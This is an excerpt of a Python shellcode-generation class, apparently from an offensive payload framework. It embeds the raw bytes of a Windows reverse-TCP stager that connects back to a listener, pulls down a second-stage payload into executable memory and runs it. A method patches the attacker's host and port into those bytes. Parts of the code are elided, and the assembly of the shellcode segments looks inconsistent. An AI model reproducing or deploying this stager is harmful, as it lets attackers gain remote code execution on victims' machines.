...
class ShellcodeModule:
    ...
    def __init__(self, cli_arguments):
        ...
        self.stager = (
            ...
            b"\xD5\x97\x68\x7F\x00\x00\x01\x68\x02\x00\x01\x00\x89\xE6\x6A\x10" +
            b"\x56\x57\x68\x99\xA5\x74\x61\xFF\xD5\x85\xC0\x74\x12\x31\xC0\x66" +
            b"\x8B\x46\x02\x86\xE0\x66\x40\x86\xE0\x66\x89\x46\x02\xEB\xDF\x6A" +
            b"\x00\x6A\x04\x56\x57\x68\x02\xD9\xC8\x5F\xFF\xD5\x8B\x36\x6A\x40" +
            b"\x68\x00\x10\x00\x00\x56\x6A\x00\x68\x58\xA4\x53\xE5\xFF\xD5\x93" +
            b"\x53\x6A\x00\x56\x53\x57\x68\x02\xD9\xC8\x5F\xFF\xD5\x01\xC3\x29" +
            b"\xC6\x85\xF6\x75\xEC\xC3")
    ...
    def payload_gen(self):
        ...
        stager_shellcode = codecs.encode(self.stager[0:self.lhost_offset], 'hex')
        ...
        stager_shellcode2 = codecs.encode(self.stager[self.lhost_offset + 4:self.lport_offset], 'hex')
        ...
        stager_shellcode3 = codecs.encode(self.stager[self.lport_offset + 2:], 'hex')
        stager_shellcode3 = "\\x" + '\\x'.join(codecs.decode(stager_shellcode3[i:i + 2], 'utf-8') for i in range(0, len(stager_shellcode3), 2))

        self.customized_shellcode = stager_shellcode + stager_shellcode2 + stager_shellcode3
        return
